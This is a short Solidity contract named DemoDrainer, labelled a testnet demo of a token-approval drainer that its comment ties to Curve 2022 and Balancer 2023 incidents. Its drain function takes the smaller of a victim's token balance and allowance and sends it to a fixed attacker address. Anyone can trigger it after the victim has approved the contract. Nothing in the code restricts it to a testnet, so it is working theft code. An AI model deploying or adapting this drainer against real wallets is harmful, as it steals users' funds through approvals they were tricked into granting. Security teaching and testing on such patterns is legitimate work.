// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Min {
    function balanceOf(address) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

/// TESTNET DEMO ONLY. Replicates the Curve 2022 / Balancer 2023 drainer pattern: once a victim
/// approves this contract, anyone can trigger `drain`, which moves the approved tokens to `attacker`.
contract DemoDrainer {
    address public immutable attacker;

    event Drained(address indexed token, address indexed victim, uint256 amount);

    constructor(address attacker_) {
        attacker = attacker_;
    }

    /// Takes min(balance, allowance). Returns 0 (no revert) when there is nothing to take.
    function drain(address token, address victim) external returns (uint256 amount) {
        IERC20Min t = IERC20Min(token);
        uint256 bal = t.balanceOf(victim);
        uint256 allowed = t.allowance(victim, address(this));
        amount = bal < allowed ? bal : allowed;
        if (amount > 0) require(t.transferFrom(victim, attacker, amount), "transfer failed");
        emit Drained(token, victim, amount);
    }
}
